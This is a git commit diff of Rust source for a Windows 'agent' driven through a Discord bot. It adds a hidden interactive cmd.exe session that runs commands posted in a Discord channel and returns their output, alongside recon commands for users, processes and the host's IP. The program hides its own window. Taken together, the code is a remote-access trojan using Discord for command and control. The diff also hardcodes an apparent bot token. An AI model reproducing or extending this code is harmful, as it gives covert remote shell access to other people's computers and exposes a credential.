215c521e5dee69a7d92f0689b031ab70337b2527
Evan Huff <ehuff007@gmail.com>
2023-03-26 00:40:30 -0400

    Somewhat working implementation of command framework

--- src/main.rs
+++ src/main.rs
@@ -1,18 +1,23 @@
 #![windows_subsystem = "windows"]
 
+use std::io::{Read, Write};
+use std::os::windows::process::CommandExt;
+use std::sync::{Arc};
+use tokio::sync::Mutex;
 use std::sync::RwLock;
 use std::time::Duration;
-
+use std::process::{Child, Command, Stdio};
 use serenity::{
-    async_trait, client::Context, model::{channel::{Message}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*,
+    async_trait, client::Context, model::{channel::{Message, ChannelType}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*,
     framework::standard::{
         macros::{command, group},
         CommandResult, StandardFramework,
     },
 };
-use serenity::model::channel::ChannelType;
-
+use chrono::{DateTime, Utc};
 use uuid::Uuid;
+use serenity::framework::standard::Args;
+use tokio::io::AsyncBufReadExt;
 
 mod commands;
 
@@ -25,13 +30,34 @@ use utils::utils::*;
 static CHANNEL_NAME: RwLock<Option<Uuid>> = RwLock::new(None);
 static AGENT_CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
 static AGENT_COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
+static CMD_SESSION_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
+
+struct CmdProcess;
+
+impl TypeMapKey for CmdProcess {
+    type Value = Arc<Mutex<Option<Child>>>;
+}
+
+#[group("info")]
+#[commands(c_userlist, c_tasklist, c_whoami)]
+struct Info;
+
+#[group("cmd_session")]
+#[commands(exit, cmdsesh, run)]
+struct CmdSession;
 
 #[group("general")]
-#[commands(c_userlist, c_tasklist, c_whoami, c_cmdsesh)]
+#[commands("clear")]
 struct General;
 
 #[tokio::main]
 async fn main() {
+    // Initialize the CmdProcess
+    let cmd_process = Arc::new(Mutex::new(None));
+
+    // Add the CmdProcess to the TypeMap
+    let mut data = TypeMap::new();
+    data.insert::<CmdProcess>(cmd_process);
 
     // Configure the client with your Discord bot token in the environment.
     let token = String::from("MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY");
@@ -43,11 +69,15 @@ async fn main() {
 
     let framework = StandardFramework::new()
         .configure(|c| c.prefix("!")) // Set the bot's command prefix
-        .group(&GENERAL_GROUP);
+        .group(&GENERAL_GROUP).group(&CMDSESSION_GROUP).group(&INFO_GROUP);
 
     // Create our client object with the token and intents, throws error if building the client.
     let mut client =
-        Client::builder(&token, intents).event_handler(Handler).framework(framework).await.expect("Error when creating the client");
+        Client::builder(&token, intents)
+            .event_handler(Handler)
+            .framework(framework)
+            .type_map_insert::<CmdProcess>(Arc::clone(&data.get::<CmdProcess>().unwrap()))
+            .await.expect("Error when creating the client");
 
     if let Err(why) = client.start().await {
         println!("Client error: {:?}", why);
@@ -152,8 +182,7 @@ async fn c_whoami(ctx: &Context, msg: &Message) -> CommandResult {
 }
 
 #[command]
-#[aliases("cmdsesh")]
-async fn c_cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
+async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
     if is_designated_channel(msg)? {
         let sent_message = msg
             .channel_id
@@ -193,10 +222,38 @@ async fn c_cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
             sent_message.delete(&ctx).await.unwrap();
 
             let guild_id = msg.guild_id.unwrap();
-            let command_id = AGENT_COMMAND_ID.read().unwrap().unwrap();
-            guild_id
+            let category_id = AGENT_CAT_ID.read().unwrap().unwrap();
+
+            let session_channel = guild_id
                 .create_channel(&ctx.http, |c| {
-                    c.name("live-cmd-session").kind(ChannelType::Text).category(command_id)
+                    let now: DateTime<Utc> = Utc::now();
+                    c.name(format!("cmd-session ({})", now)).kind(ChannelType::Text).category(category_id).topic("This is an interactive session with the agent. To exit the session and close this channel, please try '!exit'.")
+                })
+                .await
+                .unwrap();
+            *CMD_SESSION_ID.write().unwrap() = Option::from(session_channel.id);
+
+            // Create the process object
+            let process = Command::new("cmd")
+                .stdin(Stdio::piped())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .creation_flags(0x08000000) // set CREATE_NO_WINDOW flag
+                .spawn()
+                .expect("failed to spawn cmd.exe process");
+
+            // Store the process object in the context data
+            let data = ctx.data.read().await;
+            let cmd_process = data.get::<CmdProcess>().expect("Failed to get CmdProcess");
+            *cmd_process.lock().await = Some(process);
+
+            interaction
+                .create_interaction_response(&ctx, |r| {
+                    r.kind(InteractionResponseType::ChannelMessageWithSource)
+                        .interaction_response_data(|d| {
+                            d.ephemeral(true)
+                                .content(format!("Please see channel {} for your interactive session!", session_channel.mention()))
+                        })
                 })
                 .await
                 .unwrap();
@@ -213,6 +270,87 @@ async fn c_cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
                 .unwrap();
             sent_message.delete(&ctx).await.unwrap();
         }
+    }
+
+    Ok(())
+}
+
+#[command]
+async fn run(ctx: &Context, msg: &Message, args: Args) -> CommandResult {
+    // Check if the message is in the designated channel and starts with the command prefix
+    let cmd_session_id = CMD_SESSION_ID.read().unwrap().clone();
+
+    if msg.channel_id != cmd_session_id.unwrap() {
+        return Ok(());
+    }
+
+    // Extract the command to run from the message
+    let command = msg.content.trim_start_matches("!run").trim();
+
+    // Get the process object from the context data
+    let data = ctx.data.read().await;
+    let cmd_process = data.get::<CmdProcess>().expect("Failed to get CmdProcess");
+    let mut process = cmd_process.lock().await;
+
+    // Check if process exists
+    if let Some(proc) = process.as_mut() {
+        // Send the user's command input to the process's stdin
+        let command = format!("{}\r\n", command);
+        proc.stdin.as_mut().unwrap().write_all(command.as_bytes()).expect("TODO: panic message");
+
+        // Read the output of the process
+        let mut stdout = proc.stdout.take().unwrap();
+        let mut stdout_data = String::new();
+        stdout.read_to_string(&mut stdout_data);
+
+        // Send the output to the channel
+        let response = format!("**stdout:**\n```\n{}\n```", stdout_data);
+        msg.channel_id.say(&ctx.http, response).await?;
+    } else {
+        msg.channel_id.say(&ctx.http, "No active command session found.").await?;
+    }
+
+    Ok(())
+}
+
+#[command]
+async fn exit(ctx: &Context, msg: &Message) -> CommandResult {
+    match session_handler(msg) {
+        Ok(true) => {
+            if let Err(why) = msg.channel_id.say(&ctx.http, "Deleting channel...").await {
+                eprintln!("Error sending message: {:?}", why);
+            }
+            let channel_id = CMD_SESSION_ID.read().unwrap().unwrap();
+            channel_id.delete(&ctx).await.expect("Error deleting the channel");
+        }
+        Ok(false) => {}
+        Err(why) => {
+            if let Err(why) = msg.channel_id.say(&ctx.http, why).await {
+                eprintln!("Error sending message: {:?}", why);
+            }
+        }
+    }
+    Ok(())
+}
+
+#[command]
+async fn clear(ctx: &Context, msg: &Message) -> CommandResult {
+    let channel_id = msg.channel_id;
+    let mut messages = channel_id
+        .messages(&ctx.http, |retriever| retriever.limit(100))
+        .await?;
+
+    while !messages.is_empty() {
+        channel_id.delete_messages(&ctx.http, &messages).await?;
+
+        // Fetch the next batch of messages
+        messages = match channel_id
+            .messages(&ctx.http, |retriever| retriever.limit(100).before(messages.last().unwrap().id))
+            .await
+        {
+            Ok(batch) if !batch.is_empty() => batch,
+            _ => break,
+        };
     }
 
     Ok(())
--- src/utils/utils.rs
+++ src/utils/utils.rs
@@ -9,8 +9,32 @@ use reqwest::get;
 use anyhow::{anyhow, Error};
 use serenity::model::channel::GuildChannel;
 
-use crate::{AGENT_COMMAND_ID, CHANNEL_NAME};
+use crate::{AGENT_COMMAND_ID, CHANNEL_NAME, CMD_SESSION_ID};
 
+// Splits the output of the tasklist command into chunks that discord can read
+pub fn split_tasklist(tasklist: &str, chunk_size: usize) -> Vec<String> {
+    let mut chunks = Vec::new();
+    let mut start = 0;
+    let mut end = chunk_size;
+
+    while start < tasklist.len() {
+        if end > tasklist.len() {
+            end = tasklist.len();
+        }
+
+        let mut chunk = tasklist[start..end].to_string();
+        if let Some(last_newline_index) = chunk.rfind('\n') {
+            end = start + last_newline_index;
+            chunk = tasklist[start..end].to_string();
+        }
+
+        chunks.push(chunk);
+        start = end + 1;
+        end = start + chunk_size;
+    }
+
+    chunks
+}
 
 // This function returns a boolean depending on whether the channel ID the message was sent in is the proper channel for sending commands.
 pub fn is_designated_channel(msg: &Message) -> Result<bool, String> {
@@ -28,6 +52,20 @@ pub fn is_designated_channel(msg: &Message) -> Result<bool, String> {
     }
 }
 
+pub fn session_handler(msg: &Message) -> Result<bool, String> {
+
+    // AGENT_COMMAND_ID is the static reference to the ChannelId for the "commands" channel.
+    let channel_id = match CMD_SESSION_ID.read().unwrap().as_ref() {
+        Some(id) => id.to_string(), //If we have a value, return it
+        None => return Ok(false), // If we don't have a value, return an error (static ref was invalid).
+    };
+
+    if msg.channel_id.to_string() == channel_id {
+        Ok(true)
+    } else {
+        Err(String::from("This command can only be used in the designated channel."))
+    }
+}
 // Small helper function to get the IP of our agent and post it to the channel
 pub async fn get_agent_ip(ctx: &Context) -> Result<(), Error> {
     let channel_id = AGENT_COMMAND_ID.read().unwrap().or(None);
@@ -101,106 +139,104 @@ pub fn get_or_create_uuid() -> io::Result<Uuid> {
 }
 
 
-// Future thinking. Use create_channel to create a new category with the UUID. Allows for creating new "channels" under the UUID category and command contexts, lots to work on there.
-pub async fn get_category_uuid(ctx: &Context, guild_id: Option<GuildId>) -> Option<ChannelId> {
-    fn get_channel_id_by_name(channels: &HashMap<ChannelId, GuildChannel>, category_id: ChannelId, channel_name: &str) -> Option<ChannelId> {
-        let channel_id = channels.iter().find_map(|(channel_id, channel)| {
-            if channel.parent_id == Option::from(category_id) && channel.name == channel_name {
+/* HANDLING FOR CHANNELS */
+async fn get_channel_id_by_name(
+    channels: &HashMap<ChannelId, GuildChannel>,
+    category_id: Option<ChannelId>,
+    channel_name: &str,
+) -> Option<ChannelId> {
+    channels
+        .iter()
+        .find_map(|(channel_id, channel)| {
+            if channel.parent_id == category_id && channel.name == channel_name {
                 Some(*channel_id)
             } else {
                 None
             }
-        });
-        channel_id
-    }
-
-    fn get_category_id(channels: &HashMap<ChannelId, GuildChannel>, id: &String) -> Option<ChannelId> {
-        let channel_id = channels.iter().find_map(|(channel_id, channel)| {
-            if channel.name == id.to_string() {
-                println!("Channel found!");
-                Some(*channel_id)
-            } else {
-                None
-            }
-        });
-        channel_id
-    }
-
-// Grab our UUID, set a variable 'channels' which is a HashMap containing the ChannelId and GuildChannel objects.
-    let uuid = CHANNEL_NAME.read().unwrap().as_ref().unwrap().to_string();
-
-    let channels = guild_id?.channels(&ctx.http).await.ok()?;
-    let category_channel_id = get_category_id(&channels, &uuid);
-
-    async fn create_commands_channel(ctx: &Context, category_id: ChannelId ,guild_id: &GuildId) -> Option<ChannelId> {
-        guild_id
-            .create_channel(ctx, |c| {
-                c.name("commands")
-                    .kind(ChannelType::Text)
-                    .topic("This is the commands center for your agent. You cannot run agent commands outside of this channel unless specified.")
-                    .category(category_id)
-            })
-            .await
-            .ok()
-            .map(|channel| {
-                *AGENT_COMMAND_ID.write().unwrap() = Some(channel.id);
-                channel.id
-            })
-    }
-
-    async fn create_agent_category(ctx: &Context, guild_id: &GuildId, uuid: &str) -> Option<ChannelId> {
-        guild_id
-            .create_channel(ctx, |c| c.name(uuid).kind(ChannelType::Category))
-            .await
-            .ok()
-            .map(|category| category.id)
-    }
-
-    match category_channel_id {
-        Some(id) => {
-            let command_channel_id = get_channel_id_by_name(&channels, id, "commands");
-            match command_channel_id {
-                Some(command_id) => {
-                    *AGENT_COMMAND_ID.write().unwrap() = Some(command_id);
-                    Some(id)
-                },
-                None => {
-                    let command_id = create_commands_channel(&ctx, id, &guild_id?).await?;
-                    Some(id)
-                }
-            }
-        },
-        None => {
-            println!("Creating agent category");
-            let category_id = create_agent_category(&ctx, &guild_id?, &uuid).await;
-            if let Some(cid) = category_id {
-                let command_id = create_commands_channel(&ctx, cid, &guild_id?).await;
-            }
-            category_id
-        }
-    }
+        })
 }
 
-    pub fn split_tasklist(tasklist: &str, chunk_size: usize) -> Vec<String> {
-        let mut chunks = Vec::new();
-        let mut start = 0;
-        let mut end = chunk_size;
+async fn create_category_channel(
+    ctx: &Context,
+    guild_id: GuildId,
+    name: &str,
+) -> Option<ChannelId> {
+    guild_id
+        .create_channel(ctx, |c| c.name(name).kind(ChannelType::Category))
+        .await
+        .ok()
+        .map(|category| category.id)
+}
 
-        while start < tasklist.len() {
-            if end > tasklist.len() {
-                end = tasklist.len();
-            }
+async fn create_text_channel(
+    ctx: &Context,
+    guild_id: GuildId,
+    category_id: ChannelId,
+    name: &str,
+    topic: &str,
+) -> Option<ChannelId> {
+    guild_id
+        .create_channel(ctx, |c| {
+            c.name(name)
+                .kind(ChannelType::Text)
+                .topic(topic)
+                .category(category_id)
+        })
+        .await
+        .ok()
+        .map(|channel| {
+            *AGENT_COMMAND_ID.write().unwrap() = Some(channel.id);
+            channel.id
+        })
+}
 
-            let mut chunk = tasklist[start..end].to_string();
-            if let Some(last_newline_index) = chunk.rfind('\n') {
-                end = start + last_newline_index;
-                chunk = tasklist[start..end].to_string();
-            }
 
-            chunks.push(chunk);
-            start = end + 1;
-            end = start + chunk_size;
+pub async fn get_category_uuid(ctx: &Context, guild_id: Option<GuildId>) -> Option<ChannelId> {
+    let uuid = CHANNEL_NAME.read().unwrap().as_ref().unwrap().to_string();
+    let guild_id = match guild_id {
+        Some(id) => id,
+        None => return None,
+    };
+
+    let channels = match guild_id.channels(&ctx.http).await {
+        Ok(channels) => channels,
+        Err(_) => return None,
+    };
+
+    let category_id = get_channel_id_by_name(&channels, None, &uuid).await;
+
+    if let Some(id) = category_id {
+        let command_channel_id = get_channel_id_by_name(&channels, Some(id), "commands").await;
+
+        if let Some(command_id) = command_channel_id {
+            *AGENT_COMMAND_ID.write().unwrap() = Some(command_id);
+        } else {
+            create_text_channel(
+                &ctx,
+                guild_id,
+                id,
+                "commands",
+                "This is the command center for your agent. You cannot run agent commands outside of this channel unless specified. Use '!clear' to clean up the channel.",
+            )
+                .await;
         }
+    } else {
+        println!("Creating agent category");
+        let category_id = create_category_channel(&ctx, guild_id, &uuid).await;
 
-        chunks
+        if let Some(cid) = category_id {
+            create_text_channel(
+                &ctx,
+                guild_id,
+                cid,
+                "commands",
+                "This is the commands center for your agent. You cannot run agent commands outside of this channel unless specified.",
+            )
+                .await;
+        }
     }
+
+    category_id
+}
+
+
